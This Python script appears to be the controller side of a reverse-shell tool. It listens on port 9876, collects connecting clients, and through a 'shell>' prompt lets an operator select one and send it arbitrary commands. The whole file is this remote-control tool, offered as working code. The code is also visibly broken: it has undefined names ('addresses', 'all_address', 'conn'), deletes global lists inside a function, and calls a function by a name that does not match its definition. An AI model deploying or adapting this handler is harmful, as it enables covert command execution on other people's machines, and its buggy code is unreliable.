import socket
import sys
import threading
import time

from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
all_connections = []
all_addresses = []

queue = Queue()


def create_socket():
    try:
        global HOST
        global PORT
        global s

        HOST = ""
        PORT = 9876
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


def bind_socket():
    try:
        global HOST
        global PORT
        global s

        print("Binding the Port: " + str(PORT))

        s.bind((HOST, PORT))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error" + str(msg) + "\nRetrying...")
        bind_socket()


def accept_conn():
    for c in all_connections:
        c.close()

    del all_connections
    del all_addresses

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1)

            all_connections.append(conn)
            all_addresses.append(addr)

            print("Connected to: " + addresses[0])

        except:
            print("Errorexcepting connection")


def custom_shell():
    while True:
        cmd = input("shell> ")
        if cmd == "list":
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognised")


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results = f"{str(i)}    {all_addresses[i][0]}:{all_addresses[i][1]}\n"

    print("-----------Clients-----------" + "\n" + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        print(
            f"Connected to {all_addresses[target][0]}:{all_addresses[target][1]}")
        print("[" + str(all_address[target][0]) + "] ", end="")
        return conn

    except:
        print("Selection not valid")
        return None


def send_target_command(conn):
    while True:
        try:
            cmd = input(">>")
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")


def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_conn()

        if x == 2:
            custom_shell()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


def main():
    create_workers()
    create_jobs()


if __name__ == "__main__":
    main()
